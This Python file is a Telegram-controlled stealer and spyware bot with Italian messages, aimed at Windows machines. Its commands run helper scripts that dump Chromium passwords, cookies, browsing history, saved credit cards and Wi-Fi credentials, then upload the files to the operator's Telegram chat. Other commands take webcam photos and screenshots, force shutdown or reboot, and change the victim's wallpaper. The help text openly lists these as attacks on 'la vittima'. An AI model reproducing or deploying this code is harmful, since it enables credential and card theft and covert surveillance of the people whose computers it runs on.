from telegram.ext import Updater, CommandHandler
from telegram.ext import MessageHandler, Filters
import telegram.ext
import time,os
import emoji
from ctypes import windll
import urllib.request
import pyttsx3
import win32com.client as __wincl 
import subprocess
import pyscreenshot as ImageGrab
import win32api 


def processamento():
	import win32com.client
	strComputer = "."
	objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
	objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")

	# 1. Win32_DiskDrive
	colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_DiskDrive WHERE InterfaceType = \"USB\"")
	DiskDrive_DeviceID = colItems[0].DeviceID.replace('\\', '').replace('.', '')
	DiskDrive_Caption = colItems[0].Caption

	# 2. Win32_DiskDriveToDiskPartition
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_DiskDriveToDiskPartition")
	for objItem in colItems:
		if DiskDrive_DeviceID in str(objItem.Antecedent):
			DiskPartition_DeviceID = objItem.Dependent.split('=')[1].replace('"', '')

	# 3. Win32_LogicalDiskToPartition
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_LogicalDiskToPartition")
	for objItem in colItems:
		if DiskPartition_DeviceID in str(objItem.Antecedent):
			LogicalDisk_DeviceID = objItem.Dependent.split('=')[1].replace('"', '')


	# 4. Win32_LogicalDisk
	colItems = objSWbemServices.ExecQuery("SELECT * from Win32_LogicalDisk WHERE DeviceID=\"" + LogicalDisk_DeviceID + "\"")
	print()

	return str(LogicalDisk_DeviceID)


disco = processamento()
disco=disco+"\\"



TOKEN = ""
updater = Updater(TOKEN, use_context=True)
j = updater.job_queue
uu=updater.job_queue

def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scusa non ho compreso bene il comando!!")
    context.bot.sendMessage(chat_id=update.effective_chat.id,text=emoji.emojize(":dizzy_face:"))

def history(update, context):
	global disco
	avvio = f"python {disco}CrazyPy\\Stealer\\Chromium\\History.py"
	os.system(avvio)
	emoction=emoji.emojize(":scroll:")
	context.bot.send_message(chat_id=update.effective_chat.id, text= f"Invio history in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_history.txt', 'rb'))
	os.remove(f'D:\\output_file_history.txt')


def cookie(update, context):
	global disco
	avvio = f"python {disco}CrazyPy\\Stealer\\Chromium\\Cookies.py"
	os.system(avvio)
	emoction= emoji.emojize(":cookie:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio cookie in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_cookie.txt', 'rb'))
	os.remove(f'D:\\output_file_cookie.txt')


def password(update, context):
	global disco
	avvio = f"python {disco}CrazyPy\\Stealer\\Chromium\\Passwords.py"
	os.system(avvio)
	emoction=emoji.emojize(":file_folder:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio password in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_password.txt', 'rb'))
	os.remove(f'D:\\output_file_password.txt')

def wifi(update, context):
	global disco
	avvio = f"python {disco}CrazyPy\\Stealer\\Wifi.py"
	os.system(avvio)
	emoction=emoji.emojize(":level_slider:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio informazioni sul wifi in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_wifi.txt', 'rb'))
	os.remove(f'{disco}output_file_wifi.txt')

def cards(update, context):
	global disco
	avvio = f"python {disco}Stealer\\Chromium\\CreditCards.py"
	os.system(avvio)
	emoction=emoji.emojize(":credit_card:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio credit cards in corso... {emoction}")
	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_card.txt', 'rb'))
	os.remove(f'{disco}output_file_card.txt')

def power(update, context):
	comando=context.args[0:]
	if comando == "s":
		avviso= "Spegnimento"
		os.system('@shutdown /s /t 0')
	elif comando == "r":
		avviso= "Riavvio"
		os.system('@shutdown /r /t 0')
	elif comando == "l":
		avviso= "Disconnessione"
		os.system('@shutdown /l')
	elif comando == "h":
		avviso = "Ibernazione"
		os.system('@shutdown /h')

	emoction=emoji.emojize(":keyboard:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"{avviso} del pc... {emoction}")

def webcam(update,context):
	global disco
	avvio = f"python {disco}CrazyPy\\Spying\\Webcam.py"
	os.system(avvio)
	emoction9= emoji.emojize(":camera:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione immagine dalla webcam in corso...{emoction9} ")
	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}webcam.png', 'rb'))
	os.remove(f'{disco}webcam.png')

def screenshot(update,context):
	global disco
	im = ImageGrab.grab()
	im.save("screenshot.png")
	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}screenshot.png', 'rb'))
	os.remove(f'{disco}screenshot.png')

def messaggio(update, context):
	global disco
	image=f"{disco}CrazyPy\\hacker.png"
	_SPI_SETDESKWALLPAPER = 20 
	if not os.path.exists(image):
		raise FileNotFoundError(f"Image {repr(image)} not exists")
	windll.user32.SystemParametersInfoW(_SPI_SETDESKWALLPAPER, 0, image, 3)
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Sfondo Desktop cambiato :D")

def help1(update,context):
	emoction00=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f" {emoction00} Tipi di attacchi :  {emoction00} ")
	emoction0=emoji.emojize(":file_folder:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_password {emoction0} : Ottenere un file con le password")
	emoction2=emoji.emojize(":scroll:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_history {emoction2} : Ottenere la history")
	emoction3= emoji.emojize(":cookie:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_cookie {emoction3} : Ottenere i cookies")
	emoction5= emoji.emojize(":credit_card:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_credit_cards {emoction5} : Ottenere le carte di credito")
	emoction4= emoji.emojize(":level_slider:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_wifi : Ottenere il wifi")
	emoction8= emoji.emojize(":keyboard:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/power (s,r,l,h)-->(/Shutdown/Reboot/LogOff/Hibernate {emoction4} : Spegnere riavviare ibernare o disconnettere il pc")
	emoction9= emoji.emojize(":camera:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_screenshot  : Ottieni lo screenshot del desktop della vittima")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Webcam {emoction9}: Ottieni la foto dell'utente")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Message testo : Cambi sfondo desktop alla vittima e invii un vocale")
	emoction99=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/help {emoction99}: Vi mostro i comandi che potete usare")

def main():
	print("Sto ascoltando...")
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('help', help1))
	dp.add_handler(CommandHandler('get_password',password))
	dp.add_handler(CommandHandler('get_history',history))
	dp.add_handler(CommandHandler('get_cookie',cookie))
	dp.add_handler(CommandHandler('get_credit_cards',cards))
	dp.add_handler(CommandHandler('get_wifi',wifi))
	dp.add_handler(CommandHandler('get_screenshot',screenshot))
	dp.add_handler(CommandHandler('Webcam',webcam))
	dp.add_handler(CommandHandler('power',power,pass_args=True,pass_chat_data=True))
	dp.add_handler(CommandHandler('Message',messaggio))#pass_args=True,pass_chat_data=True))
	
	

	unknown_handler = MessageHandler(Filters.command, unknown)
	dp.add_handler(unknown_handler)
	updater.start_polling()
	updater.idle()


main()


